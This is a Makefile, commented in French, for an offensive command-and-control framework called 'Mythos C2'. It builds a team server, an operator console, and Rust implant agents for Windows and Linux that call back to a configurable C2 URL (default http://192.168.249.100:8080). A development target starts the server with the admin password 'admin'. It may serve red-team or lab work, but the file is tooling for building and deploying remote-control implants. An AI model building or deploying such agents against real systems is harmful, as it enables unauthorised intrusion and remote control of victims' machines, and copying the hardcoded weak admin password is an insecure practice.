# Mythos C2 — Makefile
# Usage :
#   make server       → compiler le team server
#   make console      → compiler la console opérateur
#   make agent-win    → compiler l'agent pour Windows x64
#   make agent-linux  → compiler l'agent pour Linux x64
#   make all          → tout compiler
#   make clean        → nettoyer

C2_URL ?= http://192.168.249.100:8080
DIST    = ./dist

.PHONY: all server console agent-win agent-linux clean setup

all: setup server console agent-win

# ── Prérequis ──────────────────────────────────────────────
setup:
	@mkdir -p $(DIST)
	@echo "[*] Vérification des dépendances..."
	@which go > /dev/null || (echo "[-] Go requis" && exit 1)
	@which cargo > /dev/null || (echo "[-] Rust/Cargo requis" && exit 1)
	@echo "[+] Dépendances OK"

# ── Team Server ────────────────────────────────────────────
server:
	@echo "[*] Compilation du team server..."
	cd server && go mod tidy && \
	  go build \
	    -ldflags="-s -w" \
	    -o ../$(DIST)/mythos-server \
	    .
	@echo "[+] $(DIST)/mythos-server"
	@ls -lh $(DIST)/mythos-server

# ── Console Opérateur ──────────────────────────────────────
console:
	@echo "[*] Compilation de la console opérateur..."
	cd server && go build \
	    -ldflags="-s -w" \
	    -o ../$(DIST)/mythos-console \
	    ./cmd/console/
	@echo "[+] $(DIST)/mythos-console"

# ── Agent Windows x64 ──────────────────────────────────────
agent-win:
	@echo "[*] Compilation de l'agent Windows x64..."
	@echo "[*] C2 URL: $(C2_URL)"
	cd agent && \
	  C2_URL="$(C2_URL)" cargo build \
	    --release \
	    --target x86_64-pc-windows-gnu \
	    2>&1 | grep -E "(error|warning|Compiling|Finished)"
	@if [ -f agent/target/x86_64-pc-windows-gnu/release/agent.exe ]; then \
	    cp agent/target/x86_64-pc-windows-gnu/release/agent.exe $(DIST)/mythos-agent.exe; \
	    echo "[+] $(DIST)/mythos-agent.exe"; \
	    ls -lh $(DIST)/mythos-agent.exe; \
	else \
	    echo "[-] Compilation échouée — vérifier les erreurs ci-dessus"; \
	fi

# ── Agent Linux x64 ────────────────────────────────────────
agent-linux:
	@echo "[*] Compilation de l'agent Linux x64..."
	cd agent && \
	  C2_URL="$(C2_URL)" cargo build \
	    --release \
	    2>&1 | grep -E "(error|warning|Compiling|Finished)"
	cp agent/target/release/agent $(DIST)/mythos-agent-linux
	@echo "[+] $(DIST)/mythos-agent-linux"
	@ls -lh $(DIST)/mythos-agent-linux
	@strip $(DIST)/mythos-agent-linux

# ── Nettoyage ──────────────────────────────────────────────
clean:
	@rm -rf $(DIST)
	@cd agent && cargo clean
	@echo "[+] Nettoyage terminé"

# ── Démarrage rapide pour le développement ─────────────────
dev:
	@echo "[*] Démarrage du team server en mode développement..."
	cd server && go run . \
	    --listener-port 8080 \
	    --api-port 8443 \
	    --admin-pass "admin"

# ── Afficher l'aide ────────────────────────────────────────
help:
	@echo ""
	@echo "  Mythos C2 — Build System"
	@echo ""
	@echo "  make all              Tout compiler"
	@echo "  make server           Team server Go"
	@echo "  make console          Console opérateur"
	@echo "  make agent-win        Agent Windows x64"
	@echo "  make agent-linux      Agent Linux x64"
	@echo "  make dev              Démarrer en dev"
	@echo "  make clean            Nettoyer"
	@echo ""
	@echo "  Variables :"
	@echo "    C2_URL=https://...  URL du C2 (défaut: http://192.168.249.100:8080)"
	@echo ""
	@echo "  Exemple :"
	@echo "    make agent-win C2_URL=https://mon-c2.example.com:8080"
	@echo ""
